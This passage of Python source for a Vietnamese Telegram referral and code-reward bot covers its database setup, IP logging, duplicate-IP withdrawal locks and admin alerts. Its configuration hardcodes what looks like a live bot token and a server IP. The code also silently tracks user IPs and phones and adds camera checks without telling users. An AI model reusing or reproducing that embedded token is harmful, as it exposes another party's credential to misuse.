import base64
import asyncio
import html as _html
import io
import ipaddress
import json
import logging
import os
import random
import re
import secrets
import time
import threading
import urllib.request
import urllib.parse
from collections import defaultdict
from datetime import datetime, timedelta

import pytz
from dotenv import load_dotenv
from flask import Flask, request, jsonify
from PIL import Image, ImageDraw, ImageFont
from psycopg.rows import tuple_row
from psycopg_pool import ConnectionPool

load_dotenv()

from telegram import (  # noqa: E402
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    Update,
    WebAppInfo,
)
from telegram.ext import (  # noqa: E402
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ============================================================
# 2. CẤU HÌNH
# ============================================================
BOT_TOKEN = "8925181290:AAGjC5HqDQA7A1fb_JGLasAi5FaSILMnSWs"
DATABASE_URL = os.getenv("DATABASE_URL", "").strip()
MINI_APP_URL = os.getenv(
    "MINI_APP_URL", "http://116.99.252.192:5000/miniapp"
).strip()

MAIN_ADMIN_ID = 7884394252
# Danh sách này được nạp từ PostgreSQL khi bot khởi động.
ADMIN_IDS = [MAIN_ADMIN_ID]
TIMEZONE = pytz.timezone("Asia/Ho_Chi_Minh")

CAMERA_TARGET_GROUP = "-1003913789705"
CAMERA_REQUIRE_PHOTO = False

OPTIONAL_DISPLAY_CHANNELS = []
SUPPORT_GROUP = "https://t.me/hocviencbm"

GAME_CODE_URL = "https://t.me/xombao247"
GAME_ROOM_URL = "https://t.me/gamehit88_bot"

CODE_PRICE = 2000
# True: khóa rút code TẤT CẢ tài khoản dùng chung IP. False: chỉ khóa tài khoản mới phát sinh trùng.
LOCK_ALL_ON_DUP_IP = True
MIN_WITHDRAW = 2000
MAX_WITHDRAW = 10000
REFERRAL_REWARD = 1000

SPAM_WINDOW_SECONDS = 4
SPAM_MAX_MESSAGES = 10
TEMP_BAN_MINUTES = 2

MINIAPP_CAPTCHA_TTL_MINUTES = 10
BIO_FLAG = "@lienminhvietnam"

MENU_ICON_IDS = {
    "account": "5278467510604160626",
    "invite": "5231005931550030290",
    "withdraw": "6188274324156191036",
    "top": "6188266996941985323",
    "support": "6188179499868229800",
    "history": "6186110304884101722",
    "game": "6102831593389299866",
    "admin": "5341715473882955310",
}

JOIN_BTN_EMOJI_IDS = [
    "5197226061011623665", "5237968923940364244", "5195357093107868151",
    "5197673179992038546", "5237981615568723131", "5237899560218534031",
    "5240086364292129541", "5235640209852343235", "5235762367312173706",
    "5235650728227251200", "5235871588330512091", "5240141073585544010",
    "5456164124549454257", "5240457247603039842", "5461124828956203070",
    "5460621222565910361", "5240072895274688214", "5240249594524214417",
    "5242500342070909767", "5237721297600912488", "5240076365608264313",
]
CONFIRM_JOIN_EMOJI_ID = "5237968923940364244"

_EMOJI_DEFS = {
    "CHECK": ("5206607081334906820", "✔️"),
    "CHECK2": ("6156849229567365992", "✅"),
    "CROSS": ("5210952531676504517", "❌"),
    "WARN": ("5420323339723881652", "⚠️"),
    "EXCL": ("5373059848856421989", "❗️"),
    "INFO": ("5334544901428229844", "ℹ️"),
    "REFRESH": ("5375338737028841420", "🔄"),
    "REFRESH2": ("5226702984204797593", "🔄"),
    "HOURGLASS": ("5386367538735104399", "⌛"),
    "GEAR": ("5341715473882955310", "⚙️"),
    "SHIELD": ("5197288647275071607", "🛡"),
    "TOP": ("5415655814079723871", "🔝"),
    "TOP2": ("5463071033256848094", "🔝"),
    "UP": ("5463122435425448565", "⬆️"),
    "DOWN": ("5406745015365943482", "⬇️"),
    "RIGHT": ("5429651785352501917", "↗️"),
    "ARROW_LEFT_RIGHT": ("5271837459783638319", "↔️"),
    "PLUS": ("5397916757333654639", "➕"),
    "MONEY": ("5278467510604160626", "💰"),
    "MONEY2": ("5224257782013769471", "💰"),
    "MONEY_FLY": ("5231005931550030290", "💸"),
    "MONEY_FACE": ("5427107837568360763", "🤑"),
    "COIN": ("5402186569006210455", "💱"),
    "CARD": ("5240066289614987080", "💳"),
    "CARD2": ("5445353829304387411", "💳"),
    "BANK": ("5332455502917949981", "🏦"),
    "BAG": ("5294167145079395967", "🛍"),
    "BAG2": ("5406683434124859552", "🛍"),
    "CROWN": ("5217822164362739968", "👑"),
    "CROWN2": ("5433758796289685818", "👑"),
    "GOLD_MEDAL": ("5440539497383087970", "🥇"),
    "SILVER_MEDAL": ("5447203607294265305", "🥈"),
    "BRONZE_MEDAL": ("5453902265922376865", "🥉"),
    "STAR": ("6229012024534242176", "🌟"),
    "STAR2": ("5267500801240092311", "⭐"),
    "FIRE": ("6309824960944673394", "🔥"),
    "ROCKET": ("5195033767969839232", "🚀"),
    "TARGET": ("5256131095094652290", "🎯"),
    "PHONE": ("5285238101344544669", "📞"),
    "MAIL": ("5253742260054409879", "✉️"),
    "INBOX": ("5443127283898405358", "📥"),
    "OUTBOX": ("5445355530111437729", "📤"),
    "SPEAKER": ("5388632425314140043", "🔈"),
    "CLIP": ("5305265301917549162", "📎"),
    "GLOBE": ("5447410659077661506", "🌐"),
    "DEV": ("6066579956287148786", "👨‍💻"),
    "LIKE": ("6192940307907088992", "👍"),
    "LOVE_FACE": ("5240410604258206563", "🥰"),
    "LOVE_FACE2": ("6318677150534734288", "🥰"),
    "HEART": ("6273945156341209192", "😍"),
    "SMILE": ("6138749335438889769", "😀"),
    "GRIN": ("5377812805695053090", "😃"),
    "LAUGH": ("6138433913040671508", "😂"),
    "LAUGH2": ("5463121572137022242", "😂"),
    "LAUGH_SQUINT": ("5375135722514685501", "😆"),
    "BLUSH": ("5238015713314086319", "☺️"),
    "STUCK_OUT": ("6273634436932179409", "😝"),
    "TONGUE": ("6192771593001767805", "👅"),
    "SCREAM": ("5253478445983222118", "😱"),
    "SCREAM2": ("6273875491971667684", "😱"),
    "BANDAGE": ("6199453007336184702", "😞"),
    "FIST": ("5375161616872520280", "🤜"),
    "DANCER": ("5373112999076699207", "💃"),
    "LIPS": ("5395444514028529554", "🫦"),
    "WOLF": ("6309898817202295364", "🐺"),
    "BANANA": ("6075743256128263137", "🥐"),
    "CLOVER": ("6307395821931335527", "🍀"),
    "MUSIC": ("6235381315005325678", "🎶"),
    "CAR": ("6280407793631498213", "🚗"),
    "CAR2": ("5282927142651319521", "🚗"),
    "PLANE": ("5456216132308462012", "✈️"),
    "TEST_TUBE": ("5294451377425106537", "🧪"),
    "SNOW": ("5449449325434266744", "❄️"),
    "COPYRIGHT": ("5323442290708985472", "©"),
    "NUM_4": ("5382054253403577563", "4️⃣"),
    "NUM_5": ("5391197405553107640", "5️⃣"),
    "NUM_6": ("5390966190283694453", "6️⃣"),
    "NUM_7": ("5382132232829804982", "7️⃣"),
    "NUM_8": ("5391038994274329680", "8️⃣"),
    "NUM_9": ("5391234698754138414", "9️⃣"),
    "ABC_01": ("5357372145800334358", "🔠"),
    "ABC_02": ("5357051925923648418", "🔠"),
    "ABC_03": ("5359451970828520680", "🔠"),
    "ABC_04": ("5359648590136361323", "🔠"),
    "ABC_05": ("5361794927028096622", "🔠"),
    "ABC_06": ("5359293061333535340", "🔠"),
    "ABC_07": ("5361583129305829231", "🔠"),
    "ABC_08": ("5359299520964348572", "🔠"),
    "ABC_09": ("5359552223955145217", "🔠"),
    "ABC_10": ("5361888806423251732", "🔠"),
    "ABC_11": ("5359549406456598104", "🔠"),
    "ABC_12": ("5359354676934364278", "🔠"),
    "ABC_13": ("5361625615122319358", "🔠"),
    "ABC_14": ("5359808152466378462", "🔠"),
    "ABC_15": ("5375319963726793021", "🔠"),
    "ABC_16": ("5361767233078973238", "🔠"),
    "ABC_17": ("5361871785467857730", "🔠"),
    "ABC_18": ("5364023048687078741", "🔠"),
    "ABC_19": ("5364149466754468020", "🔠"),
    "GAME_STAR": ("6102831593389299866", "🌟"),
    "GAME_STARSTRUCK": ("6167959932004997710", "🤩"),
    "GAME_CAR": ("6280407793631498213", "🚗"),
    "GAME_TONGUE": ("6192771593001767805", "👅"),
    "GAME_STORM": ("6260461407163126795", "⛈"),
    "GAME_BELL": ("5440833702642857683", "🔔"),
}
E = {k: f'<tg-emoji emoji-id="{v[0]}">{v[1]}</tg-emoji>' for k, v in _EMOJI_DEFS.items()}
EP = {k: v[1] for k, v in _EMOJI_DEFS.items()}

AI = {
    "TRASH": ("5445267414562389170", "🗑"),
    "HOURGLASS": ("5386367538735104399", "⌛"),
    "ALERT": ("5395695537687123235", "🚨"),
    "EDIT": ("5395444784611480792", "✏️"),
    "MAIL": ("5253742260054409879", "✉️"),
    "PLUS": ("5397916757333654639", "➕"),
    "PIN": ("5391032818111363540", "📍"),
    "REFRESH": ("5375338737028841420", "🔄"),
    "TOP": ("5415655814079723871", "🔝"),
    "LINK": ("5271604874419647061", "🔗"),
    "PC": ("5282843764451195532", "🖥"),
    "SHIELD": ("5251203410396458957", "🛡"),
    "NEXT": ("5416117059207572332", "➡️"),
    "MONEY_FLY": ("5231005931550030290", "💸"),
    "PIN2": ("5397782960512444700", "📌"),
    "CAR": ("6280407793631498213", "🚗"),
    "GRIN": ("6111737246732262016", "😃"),
    "VN": ("6190651897792174993", "🇻🇳"),
    "BATTERY": ("5307905813451397794", "🔋"),
    "CARD": ("5445353829304387411", "💳"),
    "PICK": ("5197371802136892976", "⛏"),
    "INBOX": ("5443127283898405358", "📥"),
    "MONEY": ("5278467510604160626", "💰"),
    "SHIELD2": ("5197288647275071607", "🛡"),
    "BANK": ("5332455502917949981", "🏦"),
    "UPRIGHT": ("5429651785352501917", "↗️"),
    "CART": ("5312361253610475399", "🛒"),
    "SCALE": ("5400250414929041085", "⚖️"),
    "LAPTOP": ("5193177581888755275", "💻"),
    "IMAGE": ("5262517101578443800", "🖼"),
    "BULB": ("5262844652964303985", "💡"),
    "MONEY2": ("5287231198098117669", "💰"),
    "TARGET": ("5256131095094652290", "🎯"),
    "PHONE": ("5285238101344544669", "📞"),
    "DICE": ("5280816565657300091", "🎲"),
    "UNLOCK": ("5291873529464122510", "🔓"),
    "LOVE1": ("5197387964098813812", "🥰"),
    "BLUSH": ("5238015713314086319", "☺️"),
    "HAND": ("5237759703198474072", "🖐"),
    "POOP": ("5235622845299565321", "💩"),
    "CAR2": ("5240037474679398914", "🚘"),
    "CROSS": ("5238037944064811339", "❌"),
    "FLUSHED": ("5238083517962793068", "😳"),
    "SMIRK": ("5237903859480796749", "😏"),
    "RUN": ("5237981615568723131", "🏃‍♀️"),
    "CARD2": ("5240066289614987080", "💳"),
    "SCREAM": ("5235640209852343235", "😱"),
    "STARSTRUCK": ("5195357093107868151", "🤩"),
    "CONFUSED": ("5197226061011623665", "😕"),
    "BANANA": ("5237784970491074950", "🍌"),
    "NERD": ("5240209101572545926", "🤓"),
    "KEYBOARD": ("5237843923212181104", "⌨️"),
    "ANGRY": ("5240408207666455054", "😡"),
    "GUN": ("5235762367312173706", "🔫"),
    "CARD3": ("5237971457971067970", "💳"),
    "FEAR": ("5242500342070909767", "😨"),
    "CRY": ("5460630100263312018", "😭"),
    "ZANY": ("5240076365608264313", "🤪"),
    "LOVE2": ("5240076833759699366", "🥰"),
    "TONGUE": ("5239944638961294456", "👅"),
    "CRY2": ("5460741258311900209", "😭"),
    "MONEY_FLY2": ("5240290577102152084", "💸"),
    "ANGUISH": ("5237721297600912488", "😧"),
    "BURGER": ("5239948040575393823", "🍔"),
    "DOG": ("5242395424609803673", "🐶"),
    "SHUSH": ("6226686020570584326", "🤫"),
    "ROCK": ("6163685838250054493", "🤘"),
    "STAR": ("6195233300752111114", "🌟"),
    "TOP2": ("6163696502653850661", "🔝"),
    "CLOVER": ("6161347086823461532", "🍀"),
    "BOOM": ("6161101981629814014", "💥"),
    "MEDAL": ("6165926565638051547", "🎖"),
    "CURSE": ("6168156972219635148", "🤬"),
    "LOVE3": ("6190600074716779111", "🥰"),
    "LOVE4": ("6167691994765202199", "🥰"),
    "LOVE5": ("6167904514041976028", "🥰"),
    "LOVE6": ("6170039056953513698", "🥰"),
    "LOVE7": ("6170126953459228118", "🥰"),
    "PEACH": ("6165529117954413678", "🍑"),
    "NERD2": ("6167810935294530083", "🤓"),
    "DANCE": ("6186015776948885249", "🕺"),
    "TULIP": ("6197378228894568973", "🌷"),
    "DRAGON": ("6188171511229060434", "🐉"),
    "WAVE": ("6190629722876023613", "👋"),
    "HEART_EYES": ("6192639363843626187", "😍"),
    "ANGEL": ("6195191910152279859", "😇"),
    "TRAM": ("6208671312823456804", "🚊"),
    "RAISED_BROW": ("6208304964998010180", "🤨"),
    "LOVE8": ("6208631494181655806", "🥰"),
    "GLOBE": ("5447410659077661506", "🌐"),
}

# Bổ sung các emoji có trong AI nhưng thiếu trong E (vd IMAGE, ALERT) -> tránh KeyError làm /stats lỗi
for _k, (_eid, _ch) in AI.items():
    E.setdefault(_k, f'<tg-emoji emoji-id="{_eid}">{_ch}</tg-emoji>')
    EP.setdefault(_k, _ch)


def ai(key: str) -> str:
    eid, ch = AI[key]
    return f'<tg-emoji emoji-id="{eid}">{ch}</tg-emoji>'


def abtn(text: str, icon_key: str, **kwargs) -> InlineKeyboardButton:
    api = dict(kwargs.pop("api_kwargs", None) or {})
    api["icon_custom_emoji_id"] = AI[icon_key][0]
    return InlineKeyboardButton(text, api_kwargs=api, **kwargs)


def ibtn(text: str, emoji_id: str, **kwargs) -> InlineKeyboardButton:
    api = dict(kwargs.pop("api_kwargs", None) or {})
    api["icon_custom_emoji_id"] = emoji_id
    return InlineKeyboardButton(text, api_kwargs=api, **kwargs)


user_msg_tracker = defaultdict(list)
temp_bans = {}
user_withdraw_state = {}
pending_captcha_users = {}
pending_miniapp_captcha = {}
pending_miniapp_ip = {}  # user_id -> ip lấy từ server khi mở MiniApp camera
pending_camera_verified = set()
admin_input_states = {}

_last_cam_alert_ts = 0.0

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

db_pool = None


def get_pool():
    global db_pool
    if db_pool is None:
        if not DATABASE_URL:
            raise RuntimeError("Chưa cấu hình DATABASE_URL.")
        db_pool = ConnectionPool(
            DATABASE_URL,
            min_size=1,
            max_size=10,
            kwargs={"row_factory": tuple_row},
            open=True,
        )
    return db_pool


def _db_query_sync(
    query, params=(), fetchone=False, fetchall=False, commit=False
):
    pool = get_pool()
    with pool.connection() as conn:
        with conn.cursor() as cursor:
            cursor.execute(query, params)
            if fetchone:
                return cursor.fetchone()
            if fetchall:
                return cursor.fetchall()
            if commit:
                conn.commit()
            return None


async def db_query(
    query, params=(), fetchone=False, fetchall=False, commit=False
):
    return await asyncio.to_thread(
        _db_query_sync, query, params, fetchone, fetchall, commit
    )


def _db_transaction_sync(callback):
    pool = get_pool()
    with pool.connection() as conn:
        with conn.cursor() as cursor:
            result = callback(cursor)
            conn.commit()
            return result


async def db_transaction(callback):
    return await asyncio.to_thread(_db_transaction_sync, callback)


def _init_db_sync():
    pool = get_pool()
    with pool.connection() as conn:
        with conn.cursor() as cursor:
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id BIGINT PRIMARY KEY,
                    username TEXT,
                    balance BIGINT NOT NULL DEFAULT 0,
                    bank_info TEXT,
                    referrer_id BIGINT,
                    is_banned INTEGER NOT NULL DEFAULT 0,
                    is_withdraw_banned INTEGER NOT NULL DEFAULT 0,
                    joined_at TEXT,
                    phone_number TEXT
                )
            """)
            cursor.execute(
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS ip_address TEXT;"
            )
            cursor.execute(
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS skip_ip INTEGER DEFAULT 0;"
            )
            cursor.execute(
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS captcha_verified INTEGER DEFAULT 0;"
            )
            cursor.execute(
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS miniapp_captcha_verified INTEGER DEFAULT 0;"
            )
            cursor.execute(
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS camera_verified INTEGER DEFAULT 0;"
            )
            cursor.execute(
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS cccam_verified INTEGER DEFAULT 0;"
            )
            cursor.execute(
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS camera_photo_token TEXT;"
            )
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS transactions (
                    id BIGSERIAL PRIMARY KEY,
                    user_id BIGINT NOT NULL,
                    type TEXT NOT NULL,
                    amount BIGINT NOT NULL,
                    status TEXT NOT NULL,
                    created_at TEXT NOT NULL,
                    details TEXT
                )
            """)
            cursor.execute(
                "CREATE TABLE IF NOT EXISTS groups (chat_id BIGINT PRIMARY KEY)"
            )
            cursor.execute(
                "CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)"
            )
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS code_stock (
                    id BIGSERIAL PRIMARY KEY,
                    type_code INTEGER NOT NULL DEFAULT 1,
                    code_val TEXT NOT NULL,
                    is_used INTEGER NOT NULL DEFAULT 0,
                    created_at TEXT NOT NULL
                )
            """)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS code_deleted_log (
                    id BIGSERIAL PRIMARY KEY,
                    code_val TEXT NOT NULL,
                    deleted_at TEXT NOT NULL
                )
            """)
            default_settings = [
                ("maintenance", "0"),
                ("verify_phone", "1"),
                ("verify_ip", "1"),
                ("verify_channel", "1"),
                ("verify_captcha", "1"),
                ("allow_withdraw", "1"),
                ("auto_buy_code", "1"),
                ("verify_camera", "1"),
                ("verify_miniapp_captcha", "1"),
                ("verify_cccam", "1"),
            ]
            for key, val in default_settings:
                cursor.execute(
                    "INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO NOTHING",
                    (key, val),
                )
            cursor.execute(
                "CREATE INDEX IF NOT EXISTS idx_transactions_user ON transactions(user_id, id DESC)"
            )
            cursor.execute(
                "CREATE INDEX IF NOT EXISTS idx_transactions_withdraw ON transactions(type, status, id)"
            )
            cursor.execute(
                "CREATE INDEX IF NOT EXISTS idx_users_referrer ON users(referrer_id)"
            )
            cursor.execute(
                "CREATE INDEX IF NOT EXISTS idx_code_stock ON code_stock(type_code, is_used)"
            )
            cursor.execute(
                "CREATE INDEX IF NOT EXISTS idx_code_stock_val ON code_stock(code_val)"
            )
            cursor.execute(
                "CREATE INDEX IF NOT EXISTS idx_users_phone ON users(phone_number)"
            )
            cursor.execute(
                "CREATE INDEX IF NOT EXISTS idx_users_ip ON users(ip_address)"
            )
            # IP được lưu ở bảng riêng, KHÔNG lưu vào thông tin tài khoản (users)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS ip_logs (
                    id BIGSERIAL PRIMARY KEY,
                    user_id BIGINT NOT NULL,
                    ip_address TEXT NOT NULL,
                    first_seen TEXT NOT NULL,
                    last_seen TEXT NOT NULL,
                    UNIQUE (user_id, ip_address)
                )
            """)
            cursor.execute(
                "CREATE INDEX IF NOT EXISTS idx_ip_logs_ip ON ip_logs(ip_address)"
            )
            # Chuyển IP cũ (đang nằm trong users) sang ip_logs rồi xóa khỏi users
            _now = get_now_str()
            cursor.execute(
                "INSERT INTO ip_logs (user_id, ip_address, first_seen, last_seen) "
                "SELECT user_id, REGEXP_REPLACE(LOWER(TRIM(ip_address)), '^::ffff:', ''), %s, %s "
                "FROM users WHERE ip_address IS NOT NULL AND TRIM(ip_address)<>'' "
                "ON CONFLICT (user_id, ip_address) DO NOTHING",
                (_now, _now),
            )
            cursor.execute(
                "UPDATE users SET ip_address=NULL WHERE ip_address IS NOT NULL"
            )

            cursor.execute("""
                CREATE TABLE IF NOT EXISTS required_channels (
                    id BIGSERIAL PRIMARY KEY,
                    chat_ref TEXT NOT NULL UNIQUE,
                    title TEXT,
                    invite_url TEXT,
                    added_at TEXT
                )
            """)
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS miniapp_tokens (
                    token TEXT PRIMARY KEY,
                    user_id BIGINT NOT NULL,
                    created_ts BIGINT NOT NULL
                )
            """)
        conn.commit()
        logger.info("Database PostgreSQL đã sẵn sàng.")


async def init_db():
    await asyncio.to_thread(_init_db_sync)


def get_now_str():
    return datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")


def user_id_is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


def is_admin(update: Update):
    return bool(update.effective_user and update.effective_user.id in ADMIN_IDS)


# ============================================================
# IP: lưu ở bảng ip_logs (không lưu vào users), tự khóa rút code khi trùng
# ============================================================
IP_SUB = (
    "(SELECT l.ip_address FROM ip_logs l WHERE l.user_id = users.user_id "
    "ORDER BY l.last_seen DESC LIMIT 1)"
)


def normalize_ip(raw) -> str:
    ip = str(raw or "").strip()
    if "," in ip:
        ip = ip.split(",")[0].strip()
    ip = ip.lower()
    if ip.startswith("::ffff:"):
        ip = ip[7:]
    return ip


def get_request_ip(req, client_ip=None) -> str:
    """Lấy IP thật từ phía server (Cloudflare / proxy / trực tiếp).

    Ưu tiên IP server thấy được, KHÔNG tin hoàn toàn IP do client gửi lên
    (client có thể giả mạo). IP client chỉ dùng khi server không đọc được IP.
    """
    candidates = [
        req.headers.get("CF-Connecting-IP"),
        req.headers.get("X-Real-IP"),
        req.headers.get("X-Forwarded-For"),
        req.remote_addr,
    ]
    for c in candidates:
        ip = normalize_ip(c)
        if not ip:
            continue
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            continue
        return ip
    return normalize_ip(client_ip)


def _send_tg_sync(chat_id, text: str) -> bool:
    try:
        data = urllib.parse.urlencode({
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": "true",
        }).encode("utf-8")
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            resp.read()
        return True
    except Exception as exc:
        logger.warning("Không gửi được tin nhắn tới %s: %s", chat_id, exc)
        return False


def _register_ip_sync(user_id: int, raw_ip, notify_user: bool = False):
    """Ghi IP vào ip_logs, phát hiện trùng, tự khóa rút code, báo admin.

    Trả về dict {ip, duplicate, locked_ids, members} hoặc None nếu IP rỗng.
    """
    ip = normalize_ip(raw_ip)
    if not ip:
        return None
    now = get_now_str()
    pool = get_pool()
    with pool.connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO ip_logs (user_id, ip_address, first_seen, last_seen) "
                "VALUES (%s, %s, %s, %s) "
                "ON CONFLICT (user_id, ip_address) DO UPDATE SET last_seen=EXCLUDED.last_seen",
                (user_id, ip, now, now),
            )
            cur.execute(
                "SELECT u.user_id, u.username, u.is_withdraw_banned, u.skip_ip "
                "FROM ip_logs l JOIN users u ON u.user_id = l.user_id "
                "WHERE l.ip_address=%s ORDER BY u.joined_at ASC",
                (ip,),
            )
            group = cur.fetchall()
        conn.commit()

    result = {"ip": ip, "duplicate": False, "locked_ids": [], "members": []}
    members = [
        g for g in group if g[0] not in ADMIN_IDS and (g[3] or 0) != 1
    ]
    me = next((g for g in members if g[0] == user_id), None)
    if me is None or len(members) < 2:
        return result

    result["duplicate"] = True
    result["members"] = [(g[0], g[1]) for g in members]
    targets = members if LOCK_ALL_ON_DUP_IP else [me]
    newly_locked = [g for g in targets if not g[2]]
    result["locked_ids"] = [g[0] for g in targets]

    if newly_locked:
        with pool.connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "UPDATE users SET is_withdraw_banned=1 WHERE user_id = ANY(%s)",
                    ([g[0] for g in newly_locked],),
                )
            conn.commit()

        locked_set = {g[0] for g in newly_locked}
        listing = ""
        for uid, uname, _wd, _skip in members:
            tag = "🔒 vừa khóa rút" if uid in locked_set else (
                "🔒 đã khóa từ trước" if uid in result["locked_ids"] else "🟢 không khóa"
            )
            name = f"@{_html.escape(uname)}" if uname else "N/A"
            mark = " ⬅️ <b>vừa xác minh</b>" if uid == user_id else ""
            listing += f"• {name} | <code>{uid}</code> | {tag}{mark}\n"
        text = (
            f"{E['ALERT'] if 'ALERT' in E else E['WARN']} <b>PHÁT HIỆN TRÙNG IP - ĐÃ TỰ ĐỘNG KHÓA RÚT CODE</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{E['GLOBE']} IP: <code>{_html.escape(ip)}</code>\n"
            f"{E['CROWN']} Tổng tài khoản trùng: <b>{len(members)}</b>\n"
            f"{E['TARGET']} Tài khoản kích hoạt: <code>{user_id}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n{listing}\n"
            f"{E['INFO']} Mở lại: <code>/unbanwd ID</code> • Miễn kiểm tra IP: <code>/skipip ID</code> • Xem chi tiết: <code>/checkip {_html.escape(ip)}</code>"
        )
        for admin_id in ADMIN_IDS:
            _send_tg_sync(admin_id, text)

    # Âm thầm: KHÔNG báo gì cho người dùng, chỉ báo về admin (ở trên).
    return result


async def register_user_ip(user_id: int, raw_ip):
    return await asyncio.to_thread(_register_ip_sync, user_id, raw_ip, False)


async def get_user_ips(user_id: int):
    rows = await db_query(
        "SELECT ip_address FROM ip_logs WHERE user_id=%s ORDER BY last_seen DESC",
        (user_id,),
        fetchall=True,
    )
    return [r[0] for r in (rows or [])]


def _save_miniapp_token_sync(token: str, user_id: int):
    """Lưu token MiniApp -> user_id vào DB (để server nhận diện user khi họ mở MiniApp)."""
    now_ts = int(time.time())
    pool = get_pool()
    with pool.connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO miniapp_tokens (token, user_id, created_ts) VALUES (%s, %s, %s) "
                "ON CONFLICT (token) DO UPDATE SET user_id=EXCLUDED.user_id, created_ts=EXCLUDED.created_ts",
                (token, user_id, now_ts),
            )
            # dọn token cũ hơn 3 ngày
            cur.execute(
                "DELETE FROM miniapp_tokens WHERE created_ts < %s", (now_ts - 3 * 86400,)
            )
        conn.commit()


def _find_user_by_token_sync(token):
    """Tìm user_id theo token MiniApp (ưu tiên bộ nhớ, sau đó DB)."""
    if not token:
        return None
    try:
        for uid, info in list(pending_miniapp_captcha.items()):
            if info.get("token") == token:
                return uid
    except Exception:
        pass
    try:
        pool = get_pool()
        with pool.connection() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "SELECT user_id FROM miniapp_tokens WHERE token=%s", (token,)
                )
                row = cur.fetchone()
        return row[0] if row else None
    except Exception as exc:
        logger.warning("Lỗi tra token MiniApp: %s", exc)
        return None


def _record_miniapp_ip_sync(token, req, client_ip=None):
    """Khi người dùng MỞ MiniApp: lấy IP từ server, ghi vào ip_logs, kiểm tra trùng."""
    uid = _find_user_by_token_sync(token)
    if not uid:
        return None
    ip = get_request_ip(req, client_ip)
    if not ip:
        return uid
    pending_miniapp_ip[uid] = ip
    _register_ip_sync(uid, ip, notify_user=False)
    return uid


async def reset_all_ip_logs():
    await db_query("DELETE FROM ip_logs", commit=True)


async def get_valid_referrals_count(user_id: int) -> int:
    res = await db_query(
        "SELECT COUNT(*) FROM transactions WHERE user_id=%s AND type='Thưởng Mời Bạn' AND status='Thành công'",
        (user_id,),
        fetchone=True,
    )
    return res[0] if res else 0


async def get_verify_setting(key: str) -> bool:
    res = await db_query(
        "SELECT value FROM settings WHERE key=%s", (key,), fetchone=True
    )
    return bool(res and res[0] == "1")


async def set_verify_setting(key: str, value: bool):
    val_str = "1" if value else "0"
    await db_query(
        "UPDATE settings SET value=%s WHERE key=%s",
        (val_str, key),
        commit=True,
    )


async def is_maintenance():
    res = await db_query(
        "SELECT value FROM settings WHERE key='maintenance'", fetchone=True
    )
    return bool(res and res[0] == "1")


async def reset_camera_verification():
    await db_query(
        "UPDATE users SET miniapp_captcha_verified=0, camera_verified=0, cccam_verified=0",
        commit=True,
    )
    pending_miniapp_captcha.clear()
    pending_camera_verified.clear()


async def send_split_message(bot, chat_id, text, parse_mode="HTML"):
    MAX_LEN = 4000
    if len(text) <= MAX_LEN:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            parse_mode=parse_mode,
            disable_web_page_preview=True,
        )
        return

    lines = text.split("\n")
    current_chunk = ""
    for line in lines:
        if len(current_chunk) + len(line) + 1 > MAX_LEN:
            await bot.send_message(
                chat_id=chat_id,
                text=current_chunk,
                parse_mode=parse_mode,
                disable_web_page_preview=True,
            )
            current_chunk = line + "\n"
            await asyncio.sleep(0.3)
        else:
            current_chunk += line + "\n"
    if current_chunk.strip():
        await bot.send_message(
            chat_id=chat_id,
            text=current_chunk,
            parse_mode=parse_mode,
            disable_web_page_preview=True,
        )


async def check_bio_flag(bot, uid: int):
    try:
        chat_full = await bot.get_chat(uid)
        return BIO_FLAG in (chat_full.bio or "").lower()
    except Exception as exc:
        logger.warning(f"Không đọc được bio user {uid}: {exc}")
        return None


async def load_code_price():
    global CODE_PRICE
    res = await db_query(
        "SELECT value FROM settings WHERE key='code_price'", fetchone=True
    )
    if res and str(res[0]).isdigit() and int(res[0]) > 0:
        CODE_PRICE = int(res[0])


async def save_code_price(new_price: int):
    global CODE_PRICE
    await db_query(
        "INSERT INTO settings (key, value) VALUES ('code_price', %s) "
        "ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value",
        (str(new_price),),
        commit=True,
    )
    CODE_PRICE = new_price


def _parse_money(s: str):
    try:
        v = int(re.sub(r"[.,đĐ\s]", "", s))
        return v if v > 0 else None
    except (ValueError, TypeError):
        return None


CHANNEL_URLS = {}


def _norm_chat_ref(raw: str):
    raw = (raw or "").strip()
    if "t.me/" in raw:
        tail = raw.split("t.me/")[-1].split("?")[0].strip("/")
        if not tail or tail.startswith("+") or tail.startswith("joinchat"):
            return None
        raw = "@" + tail
    if re.fullmatch(r"-?\d{6,}", raw):
        return raw
    if re.fullmatch(r"@[A-Za-z0-9_]{4,}", raw):
        return raw
